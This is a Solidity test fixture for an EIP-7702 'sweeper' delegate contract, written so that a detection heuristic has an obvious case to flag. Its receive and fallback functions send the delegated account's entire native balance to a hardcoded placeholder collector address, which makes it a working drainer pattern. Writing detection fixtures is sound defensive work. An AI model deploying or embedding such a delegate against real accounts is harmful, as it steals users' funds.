// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.24;

/// @notice A malicious EIP-7702 delegate fixture matching the "sweeper"
/// pattern (LEARNING.md §6.1, §10.3): any call to the delegated account
/// forwards its entire native balance to a hardcoded collector address.
/// This is what PL-7702-011's heuristic is meant to catch — deliberately
/// obvious bytecode, not an attempt to evade detection.
contract SweeperDelegate {
    address payable public constant COLLECTOR = payable(0x000000000000000000000000000000000000bad1);

    receive() external payable {
        _sweep();
    }

    fallback() external payable {
        _sweep();
    }

    function _sweep() internal {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            COLLECTOR.transfer(balance);
        }
    }
}
